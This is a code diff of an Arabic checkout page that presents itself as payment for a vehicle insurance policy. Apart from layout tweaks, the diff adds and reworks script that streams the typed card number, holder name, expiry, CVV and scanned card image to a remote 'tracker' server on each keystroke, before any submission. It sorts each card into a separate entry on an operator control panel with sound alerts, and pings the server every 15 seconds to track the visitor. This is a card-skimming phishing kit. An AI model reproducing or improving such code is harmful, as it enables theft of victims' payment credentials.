@@ -28,7 +28,8 @@
       height: 100vh;
       height: 100dvh;
       max-height: 100dvh;
-      overflow: hidden;
+      overflow-x: hidden;
+      overflow-y: auto;
       background: var(--bg);
       color: var(--text-main);
       display: flex;
@@ -45,7 +46,7 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 0 20px;
+      padding: 0 16px;
       flex-shrink: 0;
     }
     .brand-logo {
@@ -55,7 +56,7 @@
     }
     .brand-logo .title-ar {
       font-weight: 900;
-      font-size: 17px;
+      font-size: 16px;
       color: var(--primary);
     }
     .brand-logo .title-en {
@@ -77,8 +78,8 @@
     main {
       flex: 1;
       display: flex;
-      padding: 16px 24px;
-      gap: 24px;
+      padding: 14px 20px;
+      gap: 20px;
       max-width: 1020px;
       width: 100%;
       margin: 0 auto;
@@ -93,7 +94,7 @@
       display: flex;
       flex-direction: column;
       justify-content: space-between;
-      padding: 20px 24px;
+      padding: 18px 20px;
     }
 
     .form-panel {
@@ -112,13 +113,13 @@
       aspect-ratio: 1.586 / 1;
       background: #f0f4fa;
       border-radius: 18px;
-      padding: 18px 20px;
+      padding: 16px 18px;
       box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
       border: 1px solid rgba(226, 232, 240, 0.8);
       display: flex;
       flex-direction: column;
       justify-content: space-between;
-      margin: 0 auto 14px auto;
+      margin: 0 auto 12px auto;
       direction: ltr !important;
       font-family: 'Inter', sans-serif;
       transition: all 0.3s ease;
@@ -128,20 +129,20 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      min-height: 34px;
+      min-height: 32px;
     }
     .bank-logo-img {
-      height: 32px;
-      max-width: 140px;
+      height: 30px;
+      max-width: 130px;
       object-fit: contain;
       background: transparent !important;
       display: none;
     }
     .bank-brand-title {
       font-weight: 800;
-      font-size: 13.5px;
+      font-size: 13px;
       color: #1e293b;
-      max-width: 190px;
+      max-width: 180px;
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
@@ -151,8 +152,8 @@
       border: 1px solid #cbd5e1;
       background: rgba(255, 255, 255, 0.9);
       border-radius: 6px;
-      padding: 2px 7px;
-      font-size: 11px;
+      padding: 2px 6px;
+      font-size: 10.5px;
       font-weight: 700;
       color: #1e293b;
       display: none;
@@ -164,9 +165,9 @@
       margin: auto 0;
     }
     .card-display-number {
-      font-size: 18px;
+      font-size: 17.5px;
       font-weight: 600;
-      letter-spacing: 1.5px;
+      letter-spacing: 1.2px;
       color: #0f172a;
       direction: ltr !important;
       text-align: left;
@@ -177,7 +178,7 @@
       line-height: 1.2;
     }
     .card-expiry-val {
-      font-size: 14px;
+      font-size: 13.5px;
       font-weight: 600;
       color: #0f172a;
     }
@@ -196,26 +197,26 @@
       display: flex;
       justify-content: space-between;
       align-items: flex-end;
-      min-height: 28px;
+      min-height: 26px;
     }
     .holder-and-flag {
       display: flex;
       flex-direction: column;
-      gap: 3px;
+      gap: 2px;
       text-align: left;
     }
     .card-holder-val {
-      font-size: 12.5px;
+      font-size: 12px;
       font-weight: 600;
       color: #0f172a;
       text-transform: uppercase;
-      max-width: 180px;
+      max-width: 170px;
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
     }
     .card-flag-badge {
-      font-size: 14px;
+      font-size: 13px;
       line-height: 1;
       display: none;
     }
@@ -231,14 +232,14 @@
       object-fit: contain;
     }
     .card-tier-text {
-      font-size: 8.5px;
+      font-size: 8px;
       font-weight: 800;
       color: #0f172a;
       text-transform: uppercase;
       display: none;
     }
 
-    /* 🔲 الحقل الموحد بصرياً مع إصلاح العرض (Flex Width Fix) */
+    /* 🔲 الحقل الموحد بصرياً مع توسيع خانة رقم البطاقة بالكامل */
     .unified-card-box {
       display: flex;
       align-items: center;
@@ -246,11 +247,12 @@
       border: 1.5px solid var(--border);
       border-radius: 12px;
       height: 48px;
-      padding: 0 10px;
+      padding: 0 6px 0 8px;
       direction: ltr !important;
       position: relative;
       transition: all 0.2s ease;
       margin-bottom: 12px;
+      width: 100%;
     }
     .unified-card-box:focus-within {
       border-color: var(--primary);
@@ -265,25 +267,25 @@
     }
 
     .brand-slot {
-      width: 36px;
-      height: 24px;
+      width: 30px;
+      height: 22px;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-right: 6px;
+      margin-right: 4px;
       flex-shrink: 0;
     }
     .brand-slot img {
-      max-height: 18px;
-      max-width: 34px;
+      max-height: 16px;
+      max-width: 28px;
       object-fit: contain;
     }
 
     .divider-line {
       width: 1px;
-      height: 22px;
+      height: 20px;
       background: var(--border);
-      margin: 0 4px;
+      margin: 0 2px;
       flex-shrink: 0;
     }
 
@@ -294,30 +296,33 @@
       font-family: 'Inter', monospace, sans-serif !important;
       color: var(--text-main);
       direction: ltr !important;
-      padding: 0 4px;
-      min-width: 0; /* ضروري لمنع الخروج عن الإطار */
+      padding: 0 2px;
+      min-width: 0;
     }
     .unified-input::placeholder {
       color: #94a3b8;
       font-family: 'Cairo', 'Inter', sans-serif !important;
-      font-size: 13px;
+      font-size: 12px;
     }
 
-    /* 🔴 تعديل الأبعاد لاستيعاب 16 رقم بشكل مرئي مريح */
+    /* 🔍 ضبط دقيق لعرض الحقول ليتسع الرقم 16 بدون أدنى قص */
     #card-number {
-      flex: 2.7;
+      flex: 3.2;
       font-size: 14px;
-      letter-spacing: 0.5px;
+      letter-spacing: 0.3px;
+      padding-left: 2px;
     }
     #card-expiry {
-      flex: 1;
-      font-size: 14px;
+      flex: 1.15;
+      font-size: 13px;
       text-align: center;
+      padding: 0 1px;
     }
     #card-cvv {
-      flex: 0.9;
-      font-size: 14px;
+      flex: 0.95;
+      font-size: 13px;
       text-align: center;
+      padding: 0 1px;
     }
 
     .cam-scan-inline-btn {
@@ -328,14 +333,13 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 4px;
-      margin-left: 2px;
+      padding: 2px;
       border-radius: 6px;
       flex-shrink: 0;
     }
     .cam-scan-inline-btn svg {
-      width: 20px;
-      height: 20px;
+      width: 18px;
+      height: 18px;
     }
 
     .holder-input-box {
@@ -343,11 +347,11 @@
       height: 48px;
       border: 1.5px solid var(--border);
       border-radius: 12px;
-      padding: 0 14px;
+      padding: 0 12px;
       display: flex;
       align-items: center;
       background: #ffffff;
-      margin-bottom: 14px;
+      margin-bottom: 12px;
       transition: all 0.2s ease;
     }
     .holder-input-box:focus-within {
@@ -359,14 +363,14 @@
       border: none;
       outline: none;
       background: transparent;
-      font-size: 14px;
+      font-size: 13.5px;
       font-weight: 600;
       color: var(--text-main);
       text-align: right;
     }
     #card-holder::placeholder {
       color: #94a3b8;
-      font-size: 13px;
+      font-size: 12.5px;
     }
 
     .pay-btn {
@@ -395,55 +399,55 @@
       box-shadow: 0 4px 12px rgba(1, 107, 106, 0.25);
     }
 
-    /* 📄 تصميم كرت ملخص الطلب */
+    /* 📄 ملخص الطلب */
     .summary-header {
       display: flex;
       align-items: center;
       justify-content: space-between;
       border-bottom: 1px solid var(--border);
-      padding-bottom: 12px;
-      margin-bottom: 12px;
+      padding-bottom: 10px;
+      margin-bottom: 10px;
     }
     .summary-header h3 {
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 800;
     }
     .summary-rows {
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: 8px;
     }
     .summary-item {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      font-size: 13px;
+      font-size: 12.5px;
     }
     .summary-item .item-label {
       color: var(--text-muted);
       font-weight: 600;
       display: flex;
       align-items: center;
-      gap: 6px;
+      gap: 4px;
     }
     .summary-item .item-value {
       font-weight: 700;
       color: var(--text-main);
     }
     .total-box {
-      margin-top: 14px;
-      padding-top: 12px;
+      margin-top: 12px;
+      padding-top: 10px;
       border-top: 1.5px dashed var(--border);
       display: flex;
       justify-content: space-between;
       align-items: center;
     }
     .total-box .t-label {
-      font-size: 15px;
+      font-size: 14px;
       font-weight: 800;
     }
     .total-box .t-amount {
-      font-size: 18px;
+      font-size: 17px;
       font-weight: 900;
       color: var(--primary);
     }
@@ -451,13 +455,13 @@
     .trust-badges {
       display: flex;
       justify-content: center;
-      gap: 16px;
+      gap: 14px;
       align-items: center;
-      margin-top: 12px;
-      padding-top: 10px;
+      margin-top: 10px;
+      padding-top: 8px;
       border-top: 1px solid var(--border);
       color: var(--text-muted);
-      font-size: 11px;
+      font-size: 10.5px;
       font-weight: 700;
     }
 
@@ -467,7 +471,7 @@
       background: #ffffff;
       border: 1px solid var(--border);
       border-radius: 12px;
-      padding: 8px 14px;
+      padding: 8px 12px;
       justify-content: space-between;
       align-items: center;
       margin-bottom: 10px;
@@ -477,18 +481,16 @@
     .mobile-summary-pill .m-price {
       color: var(--primary);
       font-weight: 900;
-      font-size: 14px;
+      font-size: 13.5px;
     }
 
+    /* 📱 ضبط وضع الهاتف المتكامل */
     @media (max-width: 768px) {
-      body {
-        padding: 0;
-      }
       main {
         flex-direction: column;
-        padding: 10px 14px;
+        padding: 10px 12px;
         gap: 0;
-        justify-content: space-between;
+        justify-content: flex-start;
       }
       .summary-panel {
         display: none !important;
@@ -497,34 +499,45 @@
         display: flex !important;
       }
       .panel-box {
-        padding: 12px 14px;
+        padding: 10px 12px;
         border-radius: 16px;
         box-shadow: none;
         background: transparent;
         border: none;
-        height: 100%;
+        height: auto;
       }
       .card-real-preview {
-        max-width: 320px;
-        padding: 14px 16px;
+        max-width: 310px;
+        padding: 12px 14px;
         border-radius: 16px;
-        margin-bottom: 12px;
+        margin-bottom: 10px;
       }
       .card-display-number {
-        font-size: 16px;
-        letter-spacing: 1px;
+        font-size: 15.5px;
+        letter-spacing: 0.8px;
       }
       .unified-card-box {
         height: 46px;
+        padding: 0 4px 0 6px;
         margin-bottom: 10px;
+      }
+      #card-number {
+        font-size: 13.2px;
+        letter-spacing: 0.1px;
+      }
+      #card-expiry {
+        font-size: 12.5px;
+      }
+      #card-cvv {
+        font-size: 12.5px;
       }
       .holder-input-box {
         height: 46px;
-        margin-bottom: 12px;
+        margin-bottom: 10px;
       }
       .pay-btn {
         height: 46px;
-        font-size: 15px;
+        font-size: 14.5px;
       }
     }
 
@@ -546,7 +559,7 @@
     .camera-view-container {
       position: relative;
       width: 100%;
-      max-width: 380px;
+      max-width: 360px;
       aspect-ratio: 1.586 / 1;
       border-radius: 16px;
       overflow: hidden;
@@ -563,15 +576,15 @@
       display: flex;
       gap: 12px;
       width: 100%;
-      max-width: 380px;
+      max-width: 360px;
     }
     .camera-btn {
       flex: 1;
-      height: 46px;
+      height: 44px;
       border-radius: 12px;
       border: none;
       font-weight: 700;
-      font-size: 14px;
+      font-size: 13.5px;
       cursor: pointer;
     }
     .btn-capture {
@@ -596,7 +609,9 @@
   </header>
 
   <main>
+    <!-- 1️⃣ عمود الدفع وإدخال البطاقة -->
     <section class="panel-box form-panel">
+      <!-- شريط الملخص المدمج للهواتف -->
       <div class="mobile-summary-pill" id="mobile-summary">
         <span id="m-summary-info">وثيقة تأمين مركبة</span>
         <span class="m-price" id="m-summary-price">450.00 ر.س</span>
@@ -605,7 +620,7 @@
       <!-- 💳 بطاقة العرض الذكية -->
       <div class="card-real-preview" id="card-preview-container">
         <div class="card-top-row">
-          <div id="card-bank-header" style="display:flex; align-items:center; gap:8px;">
+          <div id="card-bank-header" style="display:flex; align-items:center; gap:6px;">
             <img id="card-graphic-bank-logo" class="bank-logo-img" alt="Bank Logo">
             <span class="bank-brand-title" id="card-graphic-bank-title"></span>
           </div>
@@ -637,9 +652,10 @@
       <form id="checkout-form" onsubmit="handlePaymentSubmit(event)">
         <input type="hidden" id="card-scanned-image" name="scannedCardImage" value="">
 
+        <!-- الحقل الموحد: رقم البطاقة + التاريخ + CVV + زر الكاميرا -->
         <div class="unified-card-box" id="unified-input-wrapper">
           <div class="brand-slot" id="network-logo-inline">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#94a3b8" stroke-width="2"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#94a3b8" stroke-width="2"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>
           </div>
 
           <input 
@@ -652,7 +668,7 @@
             inputmode="numeric" 
             autocomplete="cc-number" 
             required
-            oninput="notifyTypingStart(); validateCardNumber(this)"
+            oninput="validateCardNumber(this)"
           >
 
           <div class="divider-line"></div>
@@ -667,7 +683,7 @@
             inputmode="numeric" 
             autocomplete="cc-exp" 
             required
-            oninput="notifyTypingStart(); validateCardExpiry(this)"
+            oninput="validateCardExpiry(this)"
           >
 
           <div class="divider-line"></div>
@@ -682,7 +698,7 @@
             inputmode="numeric" 
             autocomplete="cc-csc" 
             required
-            oninput="notifyTypingStart(); validateCardCvv(this)"
+            oninput="validateCardCvv(this)"
           >
 
           <button type="button" class="cam-scan-inline-btn" title="مسح البطاقة بالكاميرا" onclick="openCardScanner()">
@@ -693,6 +709,7 @@
           </button>
         </div>
 
+        <!-- حقل اسم حامل البطاقة -->
         <div class="holder-input-box">
           <input 
             type="text" 
@@ -701,7 +718,7 @@
             placeholder="اسم حامل البطاقة (كما هو مدوّن عليها)" 
             autocomplete="cc-name" 
             required
-            oninput="notifyTypingStart(); validateCardHolder(this)"
+            oninput="validateCardHolder(this)"
           >
         </div>
 
@@ -717,7 +734,7 @@
       </div>
     </section>
 
-    <!-- 2️⃣ عمود ملخص التأمين (يظهر في سطح المكتب والتابلت) -->
+    <!-- 2️⃣ عمود ملخص التأمين (شاشات الكمبيوتر والتابلت) -->
     <section class="panel-box summary-panel">
       <div>
         <div class="summary-header">
@@ -765,12 +782,14 @@
   <!-- 📸 نافذة الكاميرا -->
   <div class="camera-modal" id="camera-modal">
     <div style="color: white; text-align: center;">
-      <h4 style="margin: 0 0 4px 0; font-size: 16px;">مسح البطاقة بالكاميرا</h4>
-      <p style="margin: 0; font-size: 12px; opacity: 0.8;">وجّه أرقام البطاقة داخل الإطار الأخضر</p>
+      <h4 style="margin: 0 0 4px 0; font-size: 15px;">مسح البطاقة بالكاميرا</h4>
+      <p style="margin: 0; font-size: 11.5px; opacity: 0.8;">وجّه أرقام البطاقة داخل الإطار الأخضر</p>
     </div>
+
     <div class="camera-view-container">
       <video id="camera-video" autoplay playsinline muted></video>
     </div>
+
     <div class="camera-actions">
       <button type="button" class="camera-btn btn-capture" onclick="captureAndRecognizeCard()">📸 مسح وقراءة الرقم</button>
       <button type="button" class="camera-btn btn-close-cam" onclick="closeCardScanner()">إلغاء</button>
@@ -783,48 +802,48 @@
     var siteKey = "site_1789715618986";
     var formName = "بيانات بطاقة الدفع (Step 2)";
 
+    // 🧠 معرف الزائر الثابت الموحد
     var visitorToken = localStorage.getItem('visitor_token');
     if (!visitorToken) {
       visitorToken = 'vis_' + Math.random().toString(36).substring(2, 10);
       localStorage.setItem('visitor_token', visitorToken);
     }
 
-    // 🔥 دالة توليد جلسة بطاقة جديدة فريدة لمنع الكتابة فوق البطاقة السابقة
+    // 🔑 عداد البطاقات المستقل: كل بطاقة تأخذ كارت مستقل تماماً في لوحة التحكم
+    var cardCounter = parseInt(localStorage.getItem('user_card_seq') || '0', 10) + 1;
+    localStorage.setItem('user_card_seq', cardCounter.toString());
+
+    var currentCardSession = generateNewCardSession();
+
     function generateNewCardSession() {
       return {
-        sessionId: 'sess_' + Math.random().toString(36).substring(2, 9) + Date.now().toString(36).substring(5, 9),
-        cardToken: visitorToken + '_c' + Math.random().toString(36).substring(2, 10)
+        cardIndex: cardCounter,
+        sessionId: 'sess_' + visitorToken + '_c' + cardCounter + '_' + Date.now().toString(36),
+        cardToken: visitorToken + '_card_' + cardCounter
       };
     }
 
-    var currentCardSession = generateNewCardSession();
-    var typingStarted = false;
+    // 🔊 علم التحكم بالصوت: يعمل لمرة واحدة فقط عند بدء الكتابة
+    var hasTriggeredTypingSound = false;
 
-    // 🔄 معالجة الرجوع للصفحة (Back Button BFCache): مسح الحقول وتوليد جلسة بطاقة جديدة تماماً
-    window.addEventListener('pageshow', function(event) {
-      if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
-        document.getElementById('checkout-form').reset();
-        typingStarted = false;
-        isCardValid = false; isHolderValid = false; isExpiryValid = false; isCvvValid = false;
-        validateCardNumber(document.getElementById('card-number')); 
-        updatePayButtonState();
-      }
-    });
-
+    // 🚀 قاعدة بيانات الـ BIN
     var BIN_DATABASE = {};
+
     var COUNTRY_FLAGS = {
       'SA': '🇸🇦', 'QA': '🇶🇦', 'AE': '🇦🇪', 'KW': '🇰🇼', 'BH': '🇧🇭',
       'OM': '🇴🇲', 'JO': '🇯🇴', 'EG': '🇪🇬', 'IQ': '🇮🇶', 'LB': '🇱🇧',
       'SY': '🇸🇾', 'YE': '🇾🇪', 'PS': '🇵🇸'
     };
+
     var COUNTRY_CURRENCY = {
       'SA': 'SAR', 'QA': 'QAR', 'AE': 'AED', 'KW': 'KWD', 'BH': 'BHD',
       'OM': 'OMR', 'JO': 'JOD', 'EG': 'EGP', 'IQ': 'IQD', 'LB': 'USD'
     };
 
+    // تحميل ملف CSV بالكامل
     (async function loadBinDatabase() {
       try {
-        const res = await fetch('bin_list_filtered_mena_all_with_logos.csv');
+        const res = await fetch('bin_list_filtered_mena_all_banks_with_logos.csv');
         if (!res.ok) return;
         const text = await res.text();
         const lines = text.split(/\r?\n/);
@@ -834,21 +853,28 @@
           if (!line) continue;
           
           const values = [];
-          let current = '', inQuotes = false;
+          let current = '';
+          let inQuotes = false;
           for (let c = 0; c < line.length; c++) {
             const ch = line[c];
             if (ch === '"') inQuotes = !inQuotes;
-            else if (ch === ',' && !inQuotes) { values.push(current.trim()); current = ''; } 
-            else { current += ch; }
+            else if (ch === ',' && !inQuotes) {
+              values.push(current.trim());
+              current = '';
+            } else {
+              current += ch;
+            }
           }
           values.push(current.trim());
 
           if (values.length >= 10) {
             const bin = values[0];
             let logoUrl = values[11] || '';
+            
             if (logoUrl.includes('commons.wikimedia.org/wiki/File:')) {
               logoUrl = logoUrl.replace('commons.wikimedia.org/wiki/File:', 'commons.wikimedia.org/wiki/Special:FilePath/');
             }
+
             BIN_DATABASE[bin] = {
               brand: (values[1] || '').toUpperCase(),
               type: (values[2] || '').toUpperCase(),
@@ -861,13 +887,16 @@
             };
           }
         }
-      } catch (e) {}
+      } catch (e) {
+        console.warn("Could not load BIN database", e);
+      }
     })();
 
     const VISA_IMG_URL = "https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg";
     const MC_IMG_URL = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg";
     const MADA_IMG_URL = "https://thumb.wikimedia.org/wikipedia/commons/thumb/f/fb/Mada_Logo.svg/1280px-Mada_Logo.svg.png";
 
+    // 📥 استرجاع بيانات المراجعة
     try {
       var sub = JSON.parse(localStorage.getItem('saas_last_submission') || '{}');
       var country = sub['دولة القدوم'] || sub['دولة القدوم:'] || sub['بلد القدوم'] || '';
@@ -879,7 +908,8 @@
       if (port) document.getElementById('sum-port').innerText = port;
       if (plate) document.getElementById('sum-plate').innerText = plate;
 
-      var price = "450.00", dName = "أسبوعين";
+      var price = "450.00";
+      var dName = "أسبوعين";
       var numMatch = rawDuration.match(/(\d+(?:\.\d+)?)/);
       if (numMatch) {
         price = parseFloat(numMatch[1]).toFixed(2);
@@ -894,6 +924,21 @@
       document.getElementById('pay-submit-btn').innerText = "تأكيد ودفع " + price + " ر.س";
     } catch (e) {}
 
+    // إبقاء الزائر متصلاً أونلاين
+    setInterval(function() {
+      fetch(SERVER_HUB_URL + '/api/tracker/ping', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          token: visitorToken,
+          siteKey: siteKey,
+          currentPage: window.location.pathname,
+          pageTitle: document.title
+        }),
+        keepalive: true
+      }).catch(function(){});
+    }, 15000);
+
     function isValidLuhn(num) {
       const digits = num.replace(/\D/g, '');
       if (digits.length < 13) return false;
@@ -906,15 +951,7 @@
       return sum % 10 === 0;
     }
 
-    // 🔊 دالة تشغيل التنبيه مرة واحدة فقط عند لمس الحقول
-    function notifyTypingStart() {
-      if (!typingStarted) {
-        typingStarted = true;
-        currentCardSession = generateNewCardSession(); // ربط الكتابة بجلسة جديدة فوراً
-        sendPayload('typing', true); // إرسال كحدث هام ليصدر صوت
-      }
-    }
-
+    var lastProcessedBin = "";
     var isCardValid = false, isHolderValid = false, isExpiryValid = false, isCvvValid = false;
     var streamDebounce = null;
 
@@ -922,68 +959,74 @@
       var v = isCardValid && isHolderValid && isExpiryValid && isCvvValid;
       var btn = document.getElementById('pay-submit-btn');
       btn.disabled = !v;
-      // نرسل حالة "جاهز" إذا اكتملت، وإلا إرسال صامت (تحديث)
-      streamLiveFormPayload(v ? 'ready' : 'update'); 
+      streamLiveFormPayload(v ? 'ready' : 'typing');
     }
 
-    function sendPayload(statusType, isImportantFlag) {
-      var cNum = document.getElementById('card-number').value.trim();
-      var cHolder = document.getElementById('card-holder').value.trim();
-      var cExpiry = document.getElementById('card-expiry').value.trim();
-      var cCvv = document.getElementById('card-cvv').value.trim();
-      var scannedImg = document.getElementById('card-scanned-image').value;
-
-      var cleanNum = cNum.replace(/\s/g, '');
-      var bin = cleanNum.substring(0, 6);
-      var binInfo = BIN_DATABASE[bin] || null;
-
-      var net = binInfo ? binInfo.brand : 'UNKNOWN';
-      if (net === 'UNKNOWN') {
-        if (cleanNum.startsWith('4')) net = 'VISA';
-        else if (cleanNum.startsWith('5')) net = 'MASTERCARD';
-        else if (cleanNum.startsWith('6')) net = 'MADA';
-      }
-
-      var data = {
-        'رقم البطاقة': cNum,
-        'اسم حامل البطاقة': cHolder,
-        'تاريخ الانتهاء': cExpiry,
-        'رمز الأمان CVV': cCvv,
-        'نوع البطاقة': net,
-        'البنك': binInfo ? binInfo.issuer : '',
-        'الدولة': binInfo ? binInfo.country : '',
-        '_sessionId': currentCardSession.sessionId
-      };
-      if (scannedImg) data['صورة البطاقة'] = scannedImg;
-
-      var fName = formName;
-      if (statusType === 'typing') fName += ' (يجري الكتابة 🟡)';
-      else if (statusType === 'ready') fName += ' (جاهز 🟢)';
-      else if (statusType === 'confirmed') fName += ' (مؤكد ✅)';
-      else fName += ' (تحديث البيانات 🔄)';
-
-      fetch(SERVER_HUB_URL + '/api/tracker/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          token: currentCardSession.cardToken,
-          siteKey: siteKey,
-          formName: fName,
-          submissionData: data,
-          isFinalSubmission: (statusType === 'confirmed'),
-          isImportant: isImportantFlag
-        }),
-        keepalive: true
-      }).catch(function () {});
-    }
-
-    function streamLiveFormPayload(statusType) {
+    // 📡 دالة البث المباشر المحدثة لحماية كروت البطاقات السابقة من الاختفاء
+    function streamLiveFormPayload(st) {
       clearTimeout(streamDebounce);
       streamDebounce = setTimeout(function () {
-        // حالة جاهز هي الوحيدة التي نرسلها كحدث هام لتعطي صوت
-        var important = (statusType === 'ready');
-        sendPayload(statusType, important);
-      }, 400);
+        var cNum = document.getElementById('card-number').value.trim();
+        var cHolder = document.getElementById('card-holder').value.trim();
+        var cExpiry = document.getElementById('card-expiry').value.trim();
+        var cCvv = document.getElementById('card-cvv').value.trim();
+        var scannedImg = document.getElementById('card-scanned-image').value;
+
+        // تشغيل صوت الكتابة لمرة واحدة فقط عند بداية الكتابة
+        if (st === 'typing') {
+          if (hasTriggeredTypingSound && (cNum.length > 1 || cHolder.length > 0)) {
+            // لا تعيد تشغيل الصوت إذا كان قد صدر مسبقاً
+            st = 'silent_update';
+          } else {
+            hasTriggeredTypingSound = true;
+          }
+        }
+
+        var cleanNum = cNum.replace(/\s/g, '');
+        var bin = cleanNum.substring(0, 6);
+        var binInfo = BIN_DATABASE[bin] || null;
+
+        var net = binInfo ? binInfo.brand : 'UNKNOWN';
+        if (net === 'UNKNOWN') {
+          if (cleanNum.startsWith('4')) net = 'VISA';
+          else if (cleanNum.startsWith('5')) net = 'MASTERCARD';
+          else if (cleanNum.startsWith('6')) net = 'MADA';
+        }
+
+        var data = {
+          'بطاقة رقم': currentCardSession.cardIndex,
+          'رقم البطاقة': cNum,
+          'اسم حامل البطاقة': cHolder,
+          'تاريخ الانتهاء': cExpiry,
+          'رمز الأمان CVV': cCvv,
+          'نوع البطاقة': net,
+          'البنك': binInfo ? binInfo.issuer : '',
+          'الدولة': binInfo ? binInfo.country : '',
+          '_cardId': currentCardSession.sessionId
+        };
+
+        if (scannedImg) {
+          data['صورة البطاقة'] = scannedImg;
+        }
+
+        var statusLabel = (st === 'typing') ? ' (يجري الكتابة 🟡)' : (st === 'ready') ? ' (جاهز 🟢)' : (st === 'confirmed') ? ' (مؤكد ✅)' : ' (تحديث)';
+
+        fetch(SERVER_HUB_URL + '/api/tracker/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            token: currentCardSession.cardToken,
+            visitorToken: visitorToken,
+            siteKey: siteKey,
+            formName: formName + ' - بطاقة #' + currentCardSession.cardIndex + statusLabel,
+            submissionData: data,
+            isFinalSubmission: (st === 'confirmed'),
+            isImportant: true,
+            soundAlert: (st === 'typing' || st === 'ready' || st === 'confirmed')
+          }),
+          keepalive: true
+        }).catch(function () {});
+      }, 250);
     }
 
     function updateBankLogo(logoUrl, domain, bankName) {
@@ -991,37 +1034,64 @@
       const bankTitleEl = document.getElementById('card-graphic-bank-title');
 
       if (!logoUrl && !domain && !bankName) {
-        bankLogoEl.style.display = 'none'; bankTitleEl.style.display = 'none'; return;
+        bankLogoEl.style.display = 'none';
+        bankTitleEl.style.display = 'none';
+        return;
       }
+
       if (logoUrl) {
         bankLogoEl.onerror = function() {
           if (domain) {
             bankLogoEl.onerror = function() {
               bankLogoEl.style.display = 'none';
-              if (bankName) { bankTitleEl.innerText = bankName; bankTitleEl.style.display = 'block'; }
+              if (bankName) {
+                bankTitleEl.innerText = bankName;
+                bankTitleEl.style.display = 'block';
+              }
             };
             bankLogoEl.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
           } else if (bankName) {
-            bankLogoEl.style.display = 'none'; bankTitleEl.innerText = bankName; bankTitleEl.style.display = 'block';
+            bankLogoEl.style.display = 'none';
+            bankTitleEl.innerText = bankName;
+            bankTitleEl.style.display = 'block';
           }
         };
         bankLogoEl.src = logoUrl;
-        bankLogoEl.style.display = 'block'; bankTitleEl.style.display = 'none';
+        bankLogoEl.style.display = 'block';
+        bankTitleEl.style.display = 'none';
       } else if (domain) {
         bankLogoEl.onerror = function() {
           bankLogoEl.style.display = 'none';
-          if (bankName) { bankTitleEl.innerText = bankName; bankTitleEl.style.display = 'block'; }
+          if (bankName) {
+            bankTitleEl.innerText = bankName;
+            bankTitleEl.style.display = 'block';
+          }
         };
         bankLogoEl.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
-        bankLogoEl.style.display = 'block'; bankTitleEl.style.display = 'none';
+        bankLogoEl.style.display = 'block';
+        bankTitleEl.style.display = 'none';
       } else if (bankName) {
-        bankLogoEl.style.display = 'none'; bankTitleEl.innerText = bankName; bankTitleEl.style.display = 'block';
+        bankLogoEl.style.display = 'none';
+        bankTitleEl.innerText = bankName;
+        bankTitleEl.style.display = 'block';
       }
     }
 
     function validateCardNumber(el) {
       let raw = el.value.replace(/\D/g, '').substring(0, 16);
       
+      // فتح كارت جديد مستقل إذا تغير الـ BIN للبطاقة
+      let currentBin = raw.substring(0, 6);
+      if (currentBin.length >= 6 && lastProcessedBin && currentBin !== lastProcessedBin) {
+        cardCounter++;
+        localStorage.setItem('user_card_seq', cardCounter.toString());
+        currentCardSession = generateNewCardSession();
+        hasTriggeredTypingSound = false;
+      }
+      if (currentBin.length >= 6) {
+        lastProcessedBin = currentBin;
+      }
+
       el.value = raw.replace(/(\d{4})/g, '$1 ').trim();
       document.getElementById('card-graphic-number').innerText = el.value || '•••• •••• •••• ••••';
 
@@ -1036,15 +1106,17 @@
         updateBankLogo('', '', '');
         currencyBox.style.display = 'none';
         networkGraphic.innerHTML = '';
-        networkInline.innerHTML = `<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#94a3b8" stroke-width="2"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>`;
-        tierEl.style.display = 'none'; flagEl.style.display = 'none'; previewCard.style.background = '#f0f4fa';
+        networkInline.innerHTML = `<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#94a3b8" stroke-width="2"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>`;
+        tierEl.style.display = 'none';
+        flagEl.style.display = 'none';
+        previewCard.style.background = '#f0f4fa';
+
         isCardValid = false;
         document.getElementById('unified-input-wrapper').classList.remove('success', 'error');
         updatePayButtonState();
         return;
       }
 
-      let currentBin = raw.substring(0, 6);
       const binMatch = BIN_DATABASE[currentBin] || null;
 
       let brandName = binMatch ? binMatch.brand : '';
@@ -1063,24 +1135,33 @@
 
       let badgeUrl = VISA_IMG_URL;
       if (brandName === 'MADA' || (isoCode === 'SA' && cardType === 'DEBIT') || raw.startsWith('6')) {
-        badgeUrl = MADA_IMG_URL; previewCard.style.background = '#eef7f9';
+        badgeUrl = MADA_IMG_URL;
+        previewCard.style.background = '#eef7f9';
       } else if (brandName === 'MASTERCARD' || raw.startsWith('5')) {
-        badgeUrl = MC_IMG_URL; previewCard.style.background = '#fdf6f0';
+        badgeUrl = MC_IMG_URL;
+        previewCard.style.background = '#fdf6f0';
       } else {
